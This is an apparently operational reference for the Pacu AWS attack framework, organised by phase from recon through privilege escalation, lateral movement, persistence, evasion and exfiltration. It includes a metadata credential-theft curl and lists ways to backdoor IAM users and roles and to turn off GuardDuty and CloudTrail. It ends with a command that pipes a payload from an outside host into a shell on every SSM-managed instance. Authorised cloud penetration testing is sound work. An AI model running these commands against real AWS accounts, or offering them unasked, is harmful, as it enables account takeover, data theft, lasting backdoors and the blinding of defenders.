# Pacu module catalog by phase + privesc exploitation detail

Use `ls` / `search <term>` / `help <module>` inside Pacu for the authoritative
list in your installed version. `run <module> --regions r1,r2` applies to any
module that touches regional services; omit to use session regions
(`set_regions`) or be prompted.

## RECON_UNAUTH (no/foreign creds)

| module | use |
|---|---|
| `iam__enum_users` / `iam__enum_roles` (`--word-list`, `--role-name`) | cross-account user/role enumeration via error-message oracle (sts/assume-role trust probing); confirms principal names in a target account you have no keys for |
| `s3__bucket_finder` | wordlist bucket discovery |
| `ebs__enum_snapshots_unauth` | public EBS snapshots by account id |

## ENUM

| module | notes |
|---|---|
| `iam__enum_users_roles_policies_groups` | full IAM inventory; feeds everything else |
| `iam__enum_permissions` | builds the CONFIRMED permission set for current keys from attached/inline policies; `--all-users` / `--role-name X` to resolve other principals |
| `iam__bruteforce_permissions` | brute-tests API calls when IAM read is denied; very noisy (GuardDuty: anomalous API volume); use `--services s3,ec2,lambda` to narrow |
| `iam__get_credential_report` | password/key age report |
| `iam__detect_honeytokens` | checks current keys against known canary-token account IDs before you burn yourself |
| `ec2__enum` | instances, security groups, EIPs, volumes, snapshots, launch templates |
| `ec2__download_userdata` | decoded user-data for every instance + launch template — passwords, join tokens, keys |
| `ec2__check_termination_protection` | find instances you can kill vs not |
| `lambda__enum` | functions, env vars (credential goldmine), event sources, downloadable code URLs |
| `s3__download_bucket` | list + download buckets (`--names a,b`, `--allow-unauthenticated`) |
| `secrets__enum` | Secrets Manager values -> downloads dir |
| `systemsmanager__download_parameters` | SSM Parameter Store incl. SecureString decryption |
| `enum__secrets` | regex-sweep already-downloaded data for keys/tokens/passwords |
| `rds__enum`, `eks__enum`, `ecs__enum`, `glue__enum`, `route53__enum`, `apigateway__enum`, `codebuild__enum`, `dynamodb__enum`, `ebs__enum_volumes_snapshots`, `organizations__enum` | per-service inventory |
| `detection__enum_services` | GuardDuty detectors, CloudTrail trails, Config, Shield, S3 access logging — run EARLY |
| `cloudtrail__download_event_history` | pull event history (who else is active; what normal looks like) |

## ESCALATE — `iam__privesc_scan`

Detects the Rhino privilege-escalation methods against the confirmed-permission
set, prints `CONFIRMED` / `POTENTIAL` per method, and exploits on request.
Flags: `--scan-only` (detect only), `--offline` (evaluate every principal from
enum data, output per-user), `--method <Name>` plus method-specific args
(`--user-name`, `--role-arn`, `--policy-arn`, ...).

Method names it reports (exact strings) and what exploitation does:

| method | permissions | exploitation effect |
|---|---|---|
| `CreateNewPolicyVersion` | iam:CreatePolicyVersion | new `*:*` version of an attached policy, `--set-as-default` |
| `SetExistingDefaultPolicyVersion` | iam:SetDefaultPolicyVersion | flip to an older, fatter policy version |
| `CreateAccessKey` | iam:CreateAccessKey | mint keys for another (admin) user |
| `CreateLoginProfile` / `UpdateLoginProfile` | iam:Create/UpdateLoginProfile | set console password on a user without one / reset existing |
| `AttachUserPolicy` / `AttachGroupPolicy` / `AttachRolePolicy` | iam:Attach*Policy | attach `arn:aws:iam::aws:policy/AdministratorAccess` |
| `PutUserPolicy` / `PutGroupPolicy` / `PutRolePolicy` | iam:Put*Policy | inline `*:*` policy |
| `AddUserToGroup` | iam:AddUserToGroup | join an admin group |
| `UpdatingAssumeRolePolicy` | iam:UpdateAssumeRolePolicy | rewrite a role's trust to allow our principal, then sts assume |
| `PassExistingRoleToNewLambdaThenInvoke` | iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction | lambda runs IAM calls as the passed role |
| `PassExistingRoleToNewLambdaThenTriggerWithNewDynamo` / `...ExistingDynamo` | same minus InvokeFunction + dynamodb stream perms | event-triggered invoke |
| `EditExistingLambdaFunctionWithRole` | lambda:UpdateFunctionCode | replace code of a function that already has a privileged role |
| `CreateEC2WithExistingIP` | iam:PassRole + ec2:RunInstances | instance with a privileged instance profile; creds via user-data reverse shell or metadata (`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`) |
| `PassExistingRoleToNewGlueDevEndpoint` / `UpdateExistingGlueDevEndpoint` | glue:CreateDevEndpoint (+PassRole) / glue:UpdateDevEndpoint | SSH into a dev endpoint that holds the role's creds |
| `PassExistingRoleToCloudFormation` | iam:PassRole + cloudformation:CreateStack | stack creates admin resources as the role |
| `PassExistingRoleToNewDataPipeline` | iam:PassRole + datapipeline:CreatePipeline/PutPipelineDefinition | pipeline runs arbitrary CLI as the role |
| `PassExistingRoleToNewCodeStarProject` / `CodeStarCreateProjectFromTemplate` / `CodeStarCreateProjectThenAssociateTeamMember` | codestar perms | codestar grants escalating project policies |

Exact raw-CLI equivalents of every method (for when you'd rather not use
Pacu's exploit path): `cloud-privilege-escalation` skill, `references/aws.md`.

## LATERAL_MOVE / EXPLOIT

| module | use |
|---|---|
| `systemsmanager__rce_ec2` | ssm:SendCommand across all SSM-managed instances (`--command`, `--all-instances`, `--target-os`); shells land with the instance role's creds |
| `ec2__startup_shell_script` | stop instance, implant user-data script, start (runs as root on boot) |
| `vpc__enum_lateral_movement` | peering/VPN/TGW paths between networks |
| `api_gateway__create_api_keys` | mint API keys |
| `lightsail__generate_ssh_keys` / `lightsail__generate_temp_access` / `lightsail__download_ssh_keys` | Lightsail access |
| `cognito__attack` | Cognito user-pool self-signup, attribute tampering, identity-pool credential theft |
| `ebs__explore_snapshots` | mount other instances' snapshots to loot filesystems |

## PERSIST

| module | use |
|---|---|
| `iam__backdoor_users_keys` | second access key per target user (`--usernames a,b`) |
| `iam__backdoor_users_password` | console passwords |
| `iam__backdoor_assume_role` | append a foreign principal to role trust policies (`--role-names`, `--user-arns`) |
| `lambda__backdoor_new_users` / `lambda__backdoor_new_roles` / `lambda__backdoor_new_sec_groups` | CloudWatch-event-triggered Lambdas that re-backdoor every newly created user/role/SG |
| `ec2__backdoor_ec2_sec_groups` | open ingress (`--ip 203.0.113.7/32 --port-range 1-65535`) |

## EVADE

| module | use |
|---|---|
| `detection__disruption` | per-resource choice to delete/disable/minimize GuardDuty detectors, CloudTrail trails, Config recorders — blinding but loud (triggers alerts on the disable call itself) |
| `cloudtrail__csv_injection` | poison event history exports |
| `waf__enum` | WAF posture |
| `elb__enum_logging` | which load balancers log, i.e. where your traffic is recorded |

## EXFIL

`s3__download_bucket`, `rds__explore_snapshots` (snapshot -> restore ->
dump), `ebs__explore_snapshots`, plus everything in `downloads/`.

## Non-interactive patterns

```
pacu --session s1 --module-name iam__enum_permissions --exec
pacu --session s1 --module-name iam__privesc_scan --exec --module-args "--scan-only" | tee out/privesc_scan.txt
pacu --session s1 --module-name systemsmanager__rce_ec2 --exec \
     --module-args "--all-instances --command 'curl http://203.0.113.7/x|sh' --target-os Linux"
```

Capture stdout with `tee` — `scripts/parse_pacu.py --privesc-log` consumes it.
